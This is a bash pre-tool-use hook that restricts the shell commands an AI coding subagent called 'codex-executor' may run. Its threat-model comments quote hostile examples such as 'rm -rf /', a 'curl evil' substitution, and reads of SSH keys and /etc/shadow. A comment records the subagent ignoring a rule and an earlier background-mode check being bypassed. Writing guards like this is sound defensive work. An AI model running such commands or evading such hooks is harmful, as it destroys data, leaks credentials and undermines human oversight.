#!/usr/bin/env bash
# PreToolUse guard for the `codex-executor` subagent.
#
# Threat model: defends against accidental misuse AND prompt-injected misuse by
# the codex-executor subagent itself. Stops:
#   - Command-chaining bypasses (`git status; rm -rf /`, `git $(curl evil)`,
#     `git status >/etc/cron.d/x`, `find . -exec sh -c …`).
#   - Arbitrary-file exfiltration via read-only verbs (`cat ~/.ssh/id_rsa`,
#     `cat /etc/shadow`, `ls /home/*/.ssh`).
#   - Mutation via "read-only" git subcommands that aren't actually read-only
#     (`git stash drop|pop|push|clear`, `git log --output=/path`).
#
# Wired into ~/.claude/settings.json as a PreToolUse hook with matcher "Bash".
# No-op for any other agent (main thread, other subagents).
#
# Allow rules (all must hold; first hit wins):
#   1. Command contains NO shell composition / substitution / redirection
#      metacharacters: ;  &  |  $  `  (  )  <  >  {  }  \  CR  newline.
#   2. First whitespace-delimited token is one of:
#      - the codex-dispatch.sh path (tilde or absolute form)
#      - one of the read-only verbs in $READONLY_VERBS
#      - `git` (further restricted to read-only subcommands and flags)
#   3. After a positive verb match, every positional (non-flag) arg starting
#      with `/` or `~` must resolve under one of $READ_ROOTS.
#   4. No arg may contain a glob char (`*` `?` `[` `]`).
#
# Bypass: set CLAUDE_HOOK_CODEX_GUARD=off in the environment to skip enforcement
# for the duration of that env. Each bypass is logged.
#
# Read roots: comma-or-colon-separated absolute paths via
# CLAUDE_HOOK_CODEX_READ_ROOTS. Defaults to "$HOME/github:/tmp".
#
# Audit log: every evaluated firing (allow / deny / bypass) is appended to
# $CLAUDE_HOOK_LOG_DIR/hooks.log (default ~/.claude/logs/hooks.log). No-ops for
# other agents are not logged.

set -uo pipefail

_SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd)"
# shellcheck source=scripts/lib/portable.sh
. "$_SCRIPT_DIR/lib/portable.sh"
unset _SCRIPT_DIR

HOOK_NAME="hook-codex-bash-guard"
LOG_DIR="${CLAUDE_HOOK_LOG_DIR:-$HOME/.claude/logs}"
LOG_FILE="$LOG_DIR/hooks.log"

_SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd)"
DISPATCH_ABS="${CLAUDE_HOOK_DISPATCH_ABS:-$_SCRIPT_DIR/codex-dispatch.sh}"
_ABS_NO_HOME="${DISPATCH_ABS#"$HOME/"}"
DISPATCH_REL="~/$_ABS_NO_HOME"
unset _SCRIPT_DIR _ABS_NO_HOME

READ_ROOTS_RAW="${CLAUDE_HOOK_CODEX_READ_ROOTS:-$HOME/github:/tmp}"
# Split on either : or , for ergonomics; collect non-empty entries.
IFS=':,' read -r -a READ_ROOTS <<<"$READ_ROOTS_RAW"

# Read-only verbs allowed for verify/inspection steps. NOT included on purpose:
#   find  — `-exec`/`-delete`/`-fprint` are RCE / destructive
#   sed   — without strict flag parsing, can edit files
#   awk   — `system()` shells out
#   bash sh env xargs — composition primitives we explicitly want to deny
READONLY_VERBS=(cat ls head tail wc grep pwd realpath dirname basename jq test sleep date echo true false)

# git subcommands that are unconditionally read-only (no further arg/subverb
# restriction needed). `branch` and `stash` are NOT here — they have their own
# gates further down because some of their forms mutate. Keeping them out of
# this array means a regression (e.g. accidentally removing the gate) fails
# closed: subcmd not in array → deny.
GIT_READONLY_SUBCMDS=(status log diff show rev-parse ls-files describe)

# Flag prefixes that CAUSE A WRITE on git read-only subcommands. Rejected on
# any git invocation regardless of subcommand.
GIT_WRITE_FLAGS=(--output --out-file --output-directory)

# ---------- helpers ----------

audit() {
  local decision="$1" reason="${2:-}" target="${3:-}"
  mkdir -p "$LOG_DIR" 2>/dev/null || return 0
  local ts
  ts=$(date -Iseconds 2>/dev/null || date +%Y-%m-%dT%H:%M:%S%z)
  printf '%s %s agent=%s tool=%s decision=%s reason=%q target=%q\n' \
    "$ts" "$HOOK_NAME" "${agent_type:-?}" "${tool_name:-?}" "$decision" "$reason" "$target" \
    >> "$LOG_FILE" 2>/dev/null || true
}

deny() {
  local reason="$1"
  audit deny "$reason" "${command:-}"
  cat >&2 <<EOF
codex-executor: blocked by $HOOK_NAME — $reason

  attempted: ${command:-(empty)}

Allowed:
  - $DISPATCH_REL ...   (canonical dispatch path)
  - $DISPATCH_ABS ...
  - git <read-only subcommand> ...     (subcmds: ${GIT_READONLY_SUBCMDS[*]})
  - git -C <dir> <read-only subcommand> ...
  - one of: ${READONLY_VERBS[*]}

Path args starting with / or ~ must resolve under a read root:
  ${READ_ROOTS[*]}
(override: CLAUDE_HOOK_CODEX_READ_ROOTS=path1:path2 ...)

Disallowed (always):
  shell composition / substitution / redirection — ;  &  |  \$  \`  (  )  <  >  {  }  \\  CR  newline
  glob characters in args — *  ?  [  ]
  destructive git — push, reset, commit, rebase, checkout, merge, branch -d/-D, stash drop/pop/push/clear, --output=
  find, sed, awk, bash, sh, env, xargs

Never call \`codex exec\` directly — codex-dispatch.sh encodes sandbox / approval /
trace flags the rest of the pipeline relies on.

Bypass for one turn: set CLAUDE_HOOK_CODEX_GUARD=off (logged).
EOF
  exit 2
}

allow() {
  audit allow "${1:-ok}" "${command:-}"
  exit 0
}

is_under_read_root() {
  local p="$1" abs r
  abs="$(realpath_m "$p" 2>/dev/null)" || return 1
  for r in "${READ_ROOTS[@]}"; do
    [[ -z "$r" ]] && continue
    # Normalize root and ensure trailing slash so /foo doesn't match /foobar.
    local r_abs
    r_abs="$(realpath_m "$r" 2>/dev/null)" || continue
    [[ "$r_abs" != */ ]] && r_abs="$r_abs/"
    case "$abs/" in
      "$r_abs"*) return 0 ;;
    esac
  done
  return 1
}

# Validate a single arg-string against path/traversal/glob policy.
#   - reject `..` as a path segment (closes `cat ../etc/passwd` style escapes)
#   - reject any glob char (`*` `?` `[` `]`)
#   - reject tilde paths (codex should use absolute)
#   - require absolute paths to resolve under a read root
# Used for both bare positional args and `--flag=VALUE` forms (where VALUE is
# extracted by the caller).
validate_path_token() {
  local p="$1" what="${2:-arg}"

  # Globs anywhere are denied.
  case "$p" in
    *\**|*\?*|*\[*|*\]*) deny "glob char in $what: $p" ;;
  esac

  # `..` as a path segment (e.g. `..`, `../foo`, `foo/..`, `foo/../bar`).
  # Pure substring check would reject `foo..bar` (legitimate); restrict to
  # cases where `..` is bounded by `/` or string edges.
  if [[ "$p" =~ (^|/)\.\.($|/) ]]; then
    deny "path traversal (\`..\`) in $what: $p"
  fi

  case "$p" in
    "~"*) deny "tilde path in $what (use absolute under a read root): $p" ;;
    /*)   is_under_read_root "$p" || deny "path $what outside read roots: $p" ;;
  esac
}

# Validate every positional arg after the verb. Inspects flag VALUE portions for
# the three forms a path can hide in:
#   --flag=VALUE   (long with equals)        — closes grep --file=/etc/shadow
#   -f=VALUE       (short with equals)        — closes grep -f=/etc/shadow
#   -fVALUE        (short, value attached)    — closes grep -f/etc/shadow
# Bare flags (`--flag` alone, `-i`, `-iE`) and `--flag VALUE` (space form) skip
# extraction here; the space-form value is treated as a positional on the next
# loop iteration and validated normally.
validate_args() {
  local start="${1:-1}"
  local i p val rest
  for ((i=start; i<${#parts[@]}; i++)); do
    p="${parts[i]}"
    [[ -z "$p" ]] && continue

    # `-flag=VALUE` form (long or short): validate VALUE.
    if [[ "$p" == -*=* ]]; then
      val="${p#*=}"
      [[ -n "$val" ]] && validate_path_token "$val" "flag value"
      continue
    fi

    # Bundled short flag `-X<rest>` (one or more single-letter flags optionally
    # followed by a value). To catch path-taking flags bundled behind other
    # short flags — `-rf/etc/passwd` (recursive + file-of-patterns), `-irf...`,
    # `-nf...`, `jq -rf...` — peel leading [A-Za-z] flag chars from `rest` and
    # check at each step whether what remains starts a path. Combined short
    # flags like `-iE` (rest=`E`) and pattern-shaped like `-rfoo` (rest with
    # no path-shape) end the loop without validating; treated as flags.
    if [[ "$p" =~ ^-[A-Za-z0-9].+$ ]]; then
      scan_rest="${p:2}"
      while [[ -n "$scan_rest" ]]; do
        case "$scan_rest" in
          /*|"~"*)
            validate_path_token "$scan_rest" "short flag value"
            break
            ;;
        esac
        if [[ "$scan_rest" =~ (^|/)\.\.($|/) ]]; then
          validate_path_token "$scan_rest" "short flag value"
          break
        fi
        case "$scan_rest" in
          [A-Za-z0-9]*) scan_rest="${scan_rest:1}" ;;
          *) break ;;
        esac
      done
      continue
    fi

    # Long flag (--foo) or any other dash-prefixed token (e.g. `-`).
    if [[ "$p" == -* ]]; then
      continue
    fi

    validate_path_token "$p" "arg"
  done
}

validate_dispatch_args() {
  local i p val
  for ((i=1; i<${#parts[@]}; i++)); do
    p="${parts[i]}"
    case "$p" in
      --brief-file=*)
        val="${p#*=}"
        [[ -n "$val" ]] || deny "--brief-file requires a path"
        validate_path_token "$val" "--brief-file"
        ;;
      --brief-file)
        if [[ -z "${parts[i+1]:-}" ]]; then
          deny "--brief-file requires a path"
        fi
        validate_path_token "${parts[i+1]}" "--brief-file"
        ;;
    esac
  done

  validate_args 1
}

# ---------- preflight ----------

if ! command -v jq >/dev/null 2>&1; then
  echo "$HOOK_NAME: jq missing on PATH — install jq or set CLAUDE_HOOK_CODEX_GUARD=off" >&2
  exit 2
fi

if [[ "$(detect_platform)" != "windows" ]] && ! command -v realpath >/dev/null 2>&1; then
  echo "$HOOK_NAME: realpath missing on PATH — install coreutils or set CLAUDE_HOOK_CODEX_GUARD=off" >&2
  exit 2
fi

# ---------- parse input ----------
# Read input first so bypass and audit lines can include agent/tool identity.

input="$(cat)"

agent_type="$(jq -r '.agent_type // ""' <<<"$input" 2>/dev/null)" || {
  echo "$HOOK_NAME: malformed JSON on stdin — denying" >&2
  exit 2
}
tool_name="$(jq -r '.tool_name // ""' <<<"$input" 2>/dev/null)" || {
  echo "$HOOK_NAME: malformed JSON on stdin — denying" >&2
  exit 2
}

# No-op for any caller other than the codex-executor subagent / Bash tool.
[[ "$agent_type" != "codex-executor" ]] && exit 0
[[ "$tool_name" != "Bash" ]] && exit 0

command="$(jq -r '.tool_input.command // ""' <<<"$input" 2>/dev/null)" || {
  audit deny "jq failed on tool_input.command" ""
  echo "$HOOK_NAME: malformed JSON on stdin — denying" >&2
  exit 2
}

# Bypass AFTER parse so audit line records the actual call being bypassed.
if [[ "${CLAUDE_HOOK_CODEX_GUARD:-}" == "off" ]]; then
  audit bypass "CLAUDE_HOOK_CODEX_GUARD=off" "$command"
  exit 0
fi

# Reject background mode. The dispatch script must run foreground so the
# codex-executor subagent process stays alive until codex finishes; otherwise
# the harness orphans the background job mid-run (see codex-executor.md
# §Dispatch "What goes wrong with background mode"). The doc-level rule was
# repeatedly ignored by the subagent — enforce structurally.
#
# Multi-path JSON check: the Claude Code harness payload shape for the
# `run_in_background` flag is undocumented. An initial fix that only checked
# `.tool_input.run_in_background` was bypassed in the wild (2026-05-11). Three
# plausible paths are checked; treat the multi-path strategy as deliberate
# policy, not a TODO — the right fix is `+= path on next bypass observation`
# rather than `pick one canonical path`.
run_in_bg_a="$(jq -r '.tool_input.run_in_background // empty' <<<"$input" 2>/dev/null)"
run_in_bg_b="$(jq -r '.run_in_background // empty' <<<"$input" 2>/dev/null)"
run_in_bg_c="$(jq -r '.tool_options.run_in_background // empty' <<<"$input" 2>/dev/null)"

if [[ "$run_in_bg_a" == "true" || "$run_in_bg_b" == "true" || "$run_in_bg_c" == "true" ]]; then
  deny "run_in_background:true forbidden on codex-executor Bash (orphans dispatch — see codex-executor.md §Dispatch)"
fi

if [[ -z "$command" ]]; then
  deny "tool_input.command empty"
fi

# ---------- character-level rejection ----------
#
# Reject any character that lets bash compose, substitute, or redirect — i.e.
# anything that turns one tool_input.command into N actual commands or a write.
#
# Rejected: ;  &  |  $  `  (  )  <  >  {  }  \   plus literal CR/LF.
# Permitted: tilde (~), normal punctuation, whitespace (note: our
# tokenizer doesn't honor quotes, so quoted strings tokenize on whitespace —
# document this as a known parse limitation).

if [[ "$command" == *$'\n'* ]]; then
  deny "newline in command"
fi
if [[ "$command" == *$'\r'* ]]; then
  deny "carriage return in command"
fi

# Quotes are rejected because our tokenizer (`read -r -a`) does NOT honor shell
# quoting — a quoted absolute path would be stored as `"/etc/passwd"` and skip
# the path-validation case statement (which only matches `/*` literally). Since
# command chaining is forbidden anyway, quotes serve no purpose here.
if [[ "$command" == *\"* ]]; then
  deny "double-quote in command"
fi
if [[ "$command" == *\'* ]]; then
  deny "single-quote in command"
fi

if [[ "$command" =~ [\;\&\|\$\`\(\)\<\>\{\}\\] ]]; then
  deny "shell metacharacter in command (one of ;&|\$\`()<>{}\\)"
fi

# ---------- tokenize ----------

read -r -a parts <<<"$command"
verb="${parts[0]:-}"

# ---------- allowlist: dispatch script ----------

case "$verb" in
  "$DISPATCH_REL"|"$DISPATCH_ABS")
    # Validate any path args after the verb (e.g. --cd <abs>); brief is the
    # final arg and may legitimately be a non-path string.
    validate_dispatch_args
    allow "dispatch script"
    ;;
esac

# ---------- allowlist: git read-only ----------

if [[ "$verb" == "git" ]]; then
  # Reject git-level write flags up front, regardless of subcommand.
  for ((i=1; i<${#parts[@]}; i++)); do
    p="${parts[i]}"
    for wf in "${GIT_WRITE_FLAGS[@]}"; do
      case "$p" in
        "$wf"|"$wf"=*) deny "git write flag: $p" ;;
      esac
    done
  done

  # Two supported forms:
  #   git <subcmd> [...]
  #   git -C <dir> <subcmd> [...]
  # Anything else (e.g. `git --git-dir=...`, `git -c key=val`, `git -C=dir`,
  # `git -Cdir`) is rejected to keep parsing simple and avoid mis-classifying
  # option arguments as subcommands.
  if [[ "${parts[1]:-}" == "-C" ]]; then
    if [[ -z "${parts[2]:-}" || -z "${parts[3]:-}" ]]; then
      deny "git -C requires <dir> <subcmd>"
    fi
    # Validate the -C directory against read roots before accepting the
    # subcommand. Without this `git -C /etc status` would let `git ls-files`
    # enumerate /etc and `git log` read tracked file contents.
    validate_path_token "${parts[2]}" "git -C dir"
    subcmd="${parts[3]}"
    rest_start=4
  elif [[ -n "${parts[1]:-}" && "${parts[1]}" != -* ]]; then
    subcmd="${parts[1]}"
    rest_start=2
  else
    deny "unsupported git form (only \`git <subcmd>\` and \`git -C <dir> <subcmd>\` allowed)"
  fi

  allowed=0
  for s in "${GIT_READONLY_SUBCMDS[@]}"; do
    [[ "$subcmd" == "$s" ]] && allowed=1 && break
  done

  if [[ "$subcmd" == "branch" ]]; then
    allowed=1
    for ((i=rest_start; i<${#parts[@]}; i++)); do
      case "${parts[i]}" in
        -d|-D|--delete|-m|-M|--move|-c|-C|--copy|--unset-upstream|--set-upstream-to=*|--track=*|--no-track|--edit-description|-f|--force)
          deny "git branch with destructive/mutating flag: ${parts[i]}"
          ;;
      esac
    done
  fi

  if [[ "$subcmd" == "stash" ]]; then
    # Bare `git stash` defaults to `git stash push` (mutating). Require an
    # explicit read-only subverb.
    stash_sub="${parts[rest_start]:-}"
    case "$stash_sub" in
      list|show)
        allowed=1
        ;;
      "")
        deny "bare 'git stash' is mutating (defaults to push); use 'git stash list' or 'git stash show'"
        ;;
      *)
        deny "git stash subverb not in read-only allowlist: $stash_sub (allowed: list, show)"
        ;;
    esac
  fi

  if [[ "$allowed" == "1" ]]; then
    validate_args "$rest_start"
    allow "git $subcmd"
  fi
  deny "git subcommand not in read-only allowlist: $subcmd"
fi

# ---------- allowlist: read-only verbs ----------

for v in "${READONLY_VERBS[@]}"; do
  if [[ "$verb" == "$v" ]]; then
    validate_args 1
    allow "verb $v"
  fi
done

# ---------- default deny ----------

deny "verb not in allowlist: $verb"
